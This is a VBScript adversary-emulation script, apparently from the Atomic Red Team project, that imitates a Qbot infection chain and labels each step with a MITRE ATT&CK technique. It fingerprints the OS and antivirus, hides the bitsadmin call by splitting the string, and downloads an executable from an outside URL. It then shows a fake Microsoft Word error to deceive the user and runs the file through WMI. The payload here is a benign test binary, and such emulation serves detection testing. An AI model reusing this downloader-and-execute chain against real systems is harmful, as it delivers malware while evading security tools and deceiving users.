On Error Resume Next

' Properly declare everything
Dim shell, remoteFile, wmi_os_caption, securityCenterWMI, avItems, fso, localFile, bitsadminReturn, objProcess

Set shell = WScript.CreateObject("WScript.Shell")

'   Tactic: Discovery
'   Technique: T1082 - System Information Discovery
Set wmi_os_caption = shell.Exec("wmic OS get Caption /value")

'   Tactic: Discovery
'   Technique: T1063 - Security Software Discovery
Set securityCenterWMI = GetObject("winmgmts:\\.\root\SecurityCenter2")
Set avItems = securityCenterWMI.ExecQuery("Select * From AntiVirusProduct")

Set fso = CreateObject("Scripting.FileSystemObject")
localFile = fso.GetSpecialFolder(2) & "\Atomic_Qbot.exe"

'   Tactic: Command and Control
'   Technique: T1105 - Remote File Copy
bitsadminReturn = shell.Run("bit"&"sadmin /transfer qcxjb" & Second(Now) & " /Priority HIGH " & "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello.exe " & localFile, 0, True)

'   Tactic: Defense Evasion
'   Technique: T1036 - Masquerading
MsgBox "The file can't be opened because there are problems with the content.", 0, "Microsoft Word"

'   Tactic: Execution
'   Technique: T1047 - Windows Management Instrumentation
If (bitsadminReturn = 0) And (fso.FileExists(localFile)) Then
    Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")

    objProcess.Create localFile
End If
